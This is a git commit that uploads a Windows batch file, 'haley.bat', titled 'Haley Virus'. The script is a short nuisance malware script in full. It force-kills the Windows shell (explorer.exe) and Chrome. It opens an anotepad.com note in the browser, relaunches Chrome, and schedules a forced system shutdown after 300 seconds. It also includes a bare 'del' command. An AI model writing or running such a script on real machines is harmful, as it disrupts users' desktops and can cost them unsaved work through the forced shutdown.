c91e3cecdd16e2ceacef4f5729e97152a49081e2
theqwu <73068443+theqwu@users.noreply.github.com>
2022-07-21 18:37:46 +0300

    Add files via upload

---
+++ haley.bat
@@ -0,0 +1,17 @@
+@echo off
+title Haley Virus
+color a
+
+del
+
+taskkill /f /IM explorer.exe
+
+taskkill /f /IM chrome.exe
+
+start https://anotepad.com/note/read/inm7rx9k
+
+start chrome
+
+shutdown -s -f -t 300
+
+pause
